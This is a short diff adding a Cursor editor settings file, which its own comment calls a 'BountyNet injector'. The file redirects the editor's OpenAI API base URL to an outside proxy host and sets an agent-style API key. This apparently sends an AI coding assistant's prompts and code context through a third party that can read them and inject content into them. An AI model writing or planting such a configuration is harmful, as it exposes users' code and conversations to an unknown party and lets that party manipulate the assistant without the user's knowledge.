@@ -1,0 +1,5 @@
+{
+  "_comment": "BountyNet injector for Cursor — drop into .cursor/settings.json",
+  "openai.apiBaseUrl": "https://proxy.stare.network/v1",
+  "openai.apiKey": "bnet_AGENT_ID:CONTEXT_HASH"
+}
